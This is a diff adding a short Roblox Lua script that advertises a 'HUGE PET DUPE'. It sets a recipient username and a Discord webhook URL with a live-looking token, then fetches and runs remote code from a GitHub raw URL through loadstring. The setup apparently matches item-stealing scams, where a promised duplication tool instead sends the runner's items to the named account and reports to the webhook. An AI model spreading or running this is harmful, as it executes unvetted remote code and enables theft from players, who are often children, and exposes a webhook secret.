@@ -1,0 +1,5 @@
+_G.Username = "n7lls"
+_G.HubName = "HUGE PET DUPE | APRIL 2023 UPDATED"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1099201922872914041/gtxz87Hsv_Y0o-k3D9xeCMCCxky7xB0wuzMDCa07ajHxvhKield2dt1AH4I1eLlBKW4S"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
